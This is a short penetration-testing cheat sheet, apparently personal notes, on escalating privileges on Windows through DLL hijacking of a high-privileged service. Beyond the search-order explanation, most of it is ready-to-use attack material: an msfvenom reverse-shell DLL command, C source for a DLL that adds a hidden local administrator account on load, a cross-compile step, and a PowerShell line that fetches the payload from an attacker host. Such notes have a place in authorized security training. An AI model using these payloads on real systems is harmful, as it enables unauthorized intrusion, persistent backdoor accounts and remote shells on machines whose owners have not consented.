# DLL Hijacking
By hijacking a DLL a high privileged service uses, privesc is possible.
## Standard DLL search order
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
## How to exploit
Either a DLL being missing or placing a malicious dll higher on the search order than the legitimate one works.
1. Download the potentially vulnerable service and procmon (https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) on a non-target machine.
2. With the service running, click on the Filter menu > Filter... to get into the filter configuration.
3. The filter should be "Process Name is $SERVICE.EXE then Include".
4. Observe "CreateFile" operations for DLL's.
5. Refer to the Standard DLL search order. If there are "CreateFile" operations of DLL's, are there any DLL's place lower on the search order? For example, if the DLL's are writing to the system directory, is the application directory writeable by user? If so, a malicious DLL can be crafted and placed there to be executed.
## Crafting a malicious DLL
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(IP_ADDRESS) LPORT=$(PORT) -f dll -o $NAME_OF_VULNERABLE_DLL.dll
```
Or
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Cross-compile:
```bash
x86_64-w64-mingw32-gcc maliciousdll.cpp --shared -o $NAME_OF_VULNERABLE.dll
```
Download to target machine:
```powershell
iwr -uri http://$(ATTACKER_IP)/$NAME_OF_VULNERABLE.dll -OutFile 'C:\Path\to\higher\dll\search\order\$NAME_OF_VULNERABLE.dll'
```
Once the service that uses the vulnerable DLL is started or restarted by someone of higher privileges (if the service startup type is automatic, the system can be rebooted), then the malicious DLL will be run.
